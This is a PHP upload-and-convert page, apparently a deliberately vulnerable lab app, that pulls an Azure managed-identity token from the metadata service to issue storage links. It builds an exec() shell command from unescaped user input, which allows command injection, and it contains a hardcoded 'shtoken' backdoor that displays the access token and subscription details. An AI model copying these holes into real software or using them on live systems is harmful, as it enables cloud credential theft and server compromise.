<?php
  
  session_start();

  // Redirect to login page if user is not logged in
  if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
  }
 
  $az_url = 'https://management.azure.com';
  $az_resource = urlencode($az_url);
  $token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource='.$az_resource;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $token_url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Metadata: true'
  ));
  
  $token = json_decode(curl_exec($ch),true);
  curl_close($ch);
  $token = $token['access_token'];
  $ch = curl_init();
  $instanceurl = 'http://169.254.169.254/metadata/instance?api-version=2017-08-01';
  curl_setopt($ch, CURLOPT_URL, $instanceurl);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Metadata: true'
  ));

  $instance_details = json_decode(curl_exec($ch),true);
  $sub = $instance_details['compute']['subscriptionId'];
  $rg = $instance_details['compute']['resourceGroupName'];

  $storageAccount = '<storageaccount>';;
  $containerName = '<blobname>';
  $username_no_spaces = preg_replace('/\s+/', '', $_SESSION['name']);
  function gen_sas_token($perms,$storageAccount,$containerName,$sub,$rg,$token) {
    $sasurl = 'https://management.azure.com/subscriptions/'.$sub.'/resourceGroups/'.$rg.'/providers/Microsoft.Storage/storageAccounts/'.$storageAccount.'/listServiceSas/?api-version=2017-06-01';
    $can_blob = '/blob/'.$storageAccount.'/'.$containerName;
    $startDate = time();
    $sas_expiry = date('Y-m-d H:i:s', strtotime('+1 hour', $startDate));
    $datetime = new DateTime($sas_expiry);
    $sas_expiry_d = $datetime->format(DateTime::ISO8601);
    $sas_expiry_d = substr($sas_expiry_d, 0, strpos($sas_expiry_d, "+"));
    $sas_expiry_d = $sas_expiry_d."Z";
    $sas_data = '{"canonicalizedResource":"'.$can_blob.'","signedResource":"c","signedPermission":"'.$perms.'","signedProtocol":"https","signedExpiry":"'.$sas_expiry_d.'"}';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$sasurl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$sas_data);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'Authorization: Bearer '.$token
    ));
    $sas_token = json_decode(curl_exec($ch),true);
    $sas_token = $sas_token['serviceSasToken'];
    return array ($sas_token,$sas_expiry_d);

  }  

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Z Secure PDF Converter! </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script>

        function download(fileUrl, fileName) {
        var a = document.createElement("a");
        a.href = fileUrl;
        a.setAttribute("download", fileName);
        a.click();
        }

    </script>
    <style type="text/css">
         .topcorner{
                position:absolute;
                top:0;
                right:15px;
                width:max-content;
        }
        
   </style>
 </head>
<?php

$real_ip_address="";

if (isset($_SERVER['HTTP_CLIENT_IP']))
{
    $real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $real_ip_adress));


?>
    <body>
      <div class="topcorner">
        
        <p class="text-primary"> <?php echo '<br><a href="logout.php">Logout : '.$_SESSION['name']; ?></a></p>
        <br>
        <form class="form-inline ml-auto">
          <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
          <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
        </form>
        
      </div>

      <div class="col-md-6 offset-md-3 mt-5">
              <a target="_blank" href="https://www.zscaler.com">
                <img class="rounded mx-auto d-block" src='logo.png' style="width:200px;height:200px;">
              </a>
              <br>
              <h1><a target="_blank" href="https://www.zscaler.com" class="mt-3 d-flex"> Upload Verification Files <?php echo $_SESSION['name']?></a></h1>

              <form accept-charset="UTF-8" action="" method="POST" enctype="multipart/form-data">
                <div class="form-group">
                  <label for="exampleInputEmail1" required="required">Output File Name</label>
                  <input type="text" name="filename" value="<?php echo $username_no_spaces.date("Ymds").".pdf";?>" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="<?php echo date("Ymds").".pdf";?>" readonly>
                </div>
                <hr>
                <div class="form-group mt-3">
                  <label class="mr-2">Upload your File</label>
                  <input type="file" name="fileToUpload" id="fileToUpload">
                </div>
                <hr>
                <button type="submit" name="submit" class="btn btn-primary">Submit</button>

              </form>

              <iframe id="invisible" style="display:none;"></iframe>

      </div>


<?php


  if(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]!="") {

    $target_local_dir = "../data/";	    
    $target_file = $target_local_dir . basename($_FILES["fileToUpload"]["name"]);
    $fileTmpLoc = $_FILES["fileToUpload"]["tmp_name"];
    $moveResult = move_uploaded_file($fileTmpLoc, $target_file);
    #$convert="convert \"$target_file\" \"$filepath\"" ;
    $outputFileName=$_POST["filename"];
    $username = $_POST["name"];
    $convert="convert \"$target_file\" -gravity North -pointsize 30 -annotate +0+100 'Verified by Cybernix Bank' \"$target_local_dir$outputFileName$username\"";
    exec($convert,$output,$return);
    $filepath = $target_local_dir.$outputFileName;
    $sas_token = gen_sas_token("rcw",$storageAccount,$containerName,$sub,$rg,$token);
    $sas_token = $sas_token[0];
    $sas_url = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$outputFileName.'?'.$sas_token;
    $content = file_get_contents($filepath);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sas_url);
    $dt = date("D, d M Y h:i:s")." "."UTC";
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('x-ms-blob-type: BlockBlob', 'x-ms-date: '.$dt,'Content-Length: ' . strlen($content)));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$content);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response  = curl_exec($ch);
    curl_close($ch);
    unlink($target_file);
    $sas_token_download = gen_sas_token("r",$storageAccount,$containerName,$sub,$rg,$token);
    $sas_token_d = $sas_token_download[0];
    $sas_expiry_d = $sas_token_download[1];
    $sas_url_download = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$outputFileName.'?'.$sas_token_d;
    echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">Download Your Confirmation File </label>
    <a target="_blank" href="'.$sas_url_download.'" id="it">Click Here</a><p>This link is only valid till '.$sas_expiry_d.' minutes</p></div><hr></div>';
    if(isset($_GET["shtoken"]) && $_GET["shtoken"]=="zsattack123")
      {

         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$token.'</label></div>';
         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$rg.'</label></div>';
         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$sub.'</label></div>';

      }
  }
  elseif(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]==""){
        echo '<div class="form-group mt-3"><label class="mr-2">Enter a Valid Filename/Upload a file </label></div><hr></div>';
  }

?>


 </body>
</html>